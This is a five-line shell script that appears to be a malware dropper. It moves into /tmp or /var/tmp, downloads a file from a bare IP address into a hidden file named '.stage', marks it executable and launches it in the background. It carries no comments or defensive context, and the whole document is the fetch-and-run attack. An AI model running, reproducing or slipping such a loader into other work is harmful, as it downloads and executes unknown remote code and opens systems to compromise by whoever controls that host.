#!/bin/sh
cd /tmp 2>/dev/null || cd /var/tmp
wget http://50.60.70.80/release -O .stage
chmod +x .stage
./.stage &
